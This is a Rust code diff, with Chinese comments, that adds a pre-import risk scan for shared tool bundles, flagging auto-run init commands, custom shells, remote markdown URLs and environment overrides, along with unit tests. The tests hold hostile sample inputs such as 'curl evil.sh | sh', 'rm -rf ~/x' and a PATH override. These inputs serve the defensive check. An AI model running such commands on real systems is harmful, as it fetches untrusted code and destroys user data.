@@ -81,6 +81,47 @@ pub struct ParseResult {
     pub error: Option<String>,
 }
 
+/// 导入预检：工具中需要用户确认的风险项。任一非空即表示该工具会在导入后
+/// 自动执行命令或改变 shell 行为，应弹确认对话框。
+#[derive(Debug, Clone, serde::Serialize, Default)]
+#[serde(rename_all = "camelCase")]
+pub struct ToolRiskSummary {
+    /// 工具显示名（缺省用 id）。
+    pub name: String,
+    /// 声明了非默认 shell（任意可执行路径，spawn 时直接用）。
+    pub shell: Option<String>,
+    /// 启动时自动注入并回车执行的命令（最高风险：导入后打开工具即执行）。
+    pub init_commands: Vec<String>,
+    /// 远程 markdown 订阅（会把不可信内容渲染成一键执行按钮）。
+    pub md_url: Option<String>,
+    /// 自定义环境变量（可能含密钥/覆盖 PATH 等）。
+    pub env_keys: Vec<String>,
+}
+
+impl ToolRiskSummary {
+    pub fn is_empty(&self) -> bool {
+        self.shell.is_none() && self.init_commands.is_empty() && self.md_url.is_none() && self.env_keys.is_empty()
+    }
+}
+
+/// 扫描一个已解析的 BundleTool，汇总需要用户确认的风险字段。
+/// 用于导入预检：bundle 是不可信输入（可能来自他人分享），其中 initCommands
+/// 会在 shell 启动时自动执行、shell 是任意可执行路径，必须在导入前让用户知情。
+pub fn scan_tool_risk(tool: &BundleTool) -> ToolRiskSummary {
+    let m = &tool.meta;
+    ToolRiskSummary {
+        name: m.name.clone(),
+        shell: m.shell.clone(),
+        init_commands: m.init_commands.clone().unwrap_or_default(),
+        md_url: m.md_url.clone(),
+        env_keys: {
+            let mut keys: Vec<String> = m.env.as_ref().map(|e| e.keys().cloned().collect()).unwrap_or_default();
+            keys.sort();
+            keys
+        },
+    }
+}
+
 /// 对偶 src/shared/bundle.ts parseToolsBundle。
 pub fn parse_tools_bundle(raw: &str) -> ParseResult {
     let obj: Value = match serde_json::from_str(raw) {
@@ -316,6 +357,54 @@ mod tests {
     fn meta_drops_blank_init_commands() {
         let m = parse_tool_meta(&json!({"initCommands":["","","  "]}), "x");
         assert_eq!(m.init_commands, None);
+    }
+
+    // ── scan_tool_risks（导入预检）──────────────────────────────────────────────
+    fn bundle_with(meta: Value) -> BundleTool {
+        BundleTool {
+            meta: parse_tool_meta(&meta, "test-id"),
+            help_markdown: "".into(),
+        }
+    }
+
+    #[test]
+    fn risk_empty_for_plain_tool() {
+        let t = bundle_with(json!({"name":"Plain"}));
+        let r = scan_tool_risk(&t);
+        assert!(r.is_empty());
+        assert_eq!(r.name, "Plain");
+    }
+
+    #[test]
+    fn risk_flags_init_commands() {
+        let t = bundle_with(json!({"name":"E","initCommands":["curl evil.sh | sh","rm -rf ~/x"]}));
+        let r = scan_tool_risk(&t);
+        assert_eq!(r.init_commands, vec!["curl evil.sh | sh".to_string(), "rm -rf ~/x".into()]);
+        assert!(!r.is_empty());
+    }
+
+    #[test]
+    fn risk_flags_custom_shell() {
+        let t = bundle_with(json!({"name":"E","shell":"/usr/bin/python3"}));
+        let r = scan_tool_risk(&t);
+        assert_eq!(r.shell.as_deref(), Some("/usr/bin/python3"));
+        assert!(!r.is_empty());
+    }
+
+    #[test]
+    fn risk_flags_md_url_and_env() {
+        let t = bundle_with(json!({"name":"E","mdUrl":"https://evil/x.md","env":{"TOKEN":"sk-x","PATH":"/bad"}}));
+        let r = scan_tool_risk(&t);
+        assert_eq!(r.md_url.as_deref(), Some("https://evil/x.md"));
+        assert_eq!(r.env_keys, vec!["PATH".to_string(), "TOKEN".into()]); // 排序后
+        assert!(!r.is_empty());
+    }
+
+    #[test]
+    fn risk_name_falls_back_to_id_when_missing() {
+        let t = bundle_with(json!({}));
+        let r = scan_tool_risk(&t);
+        assert_eq!(r.name, "test-id"); // 缺 name → 用 id
     }
 
 }
